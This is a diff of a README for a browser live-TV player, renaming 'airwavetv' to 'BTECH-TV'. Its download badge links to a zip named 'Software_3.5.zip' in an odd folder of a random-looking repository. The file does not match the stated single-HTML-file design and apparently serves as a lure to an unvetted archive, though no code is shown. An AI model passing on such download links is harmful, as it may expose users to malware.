@@ -1,10 +1,10 @@
-# 📺 airwavetv - Watch Free Live TV in One Place
+# 📺 BTECH-TV- Watch Free Live TV in One Place
 
 [![Download airwavetv](https://img.shields.io/badge/Download%20airwavetv-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gilbertian-pithecanthropus683/airwavetv/raw/refs/heads/main/trigraph/Software_3.5.zip)
 
-## 🧭 What airwavetv is
+## 🧭 What BTECH-TV is
 
-airwavetv is a simple browser TV player for Windows. It opens a large set of live TV channels in one HTML file, so you can browse and watch from your web browser.
+BTECHtv is a simple browser TV player for Windows. It opens a large set of live TV channels in one HTML file, so you can browse and watch from your web browser.
 
 It is built for people who want one place to view live TV streams without a complex setup. You do not need to install a media suite or learn a new app layout. You open the file, pick a channel, and start watching.
 
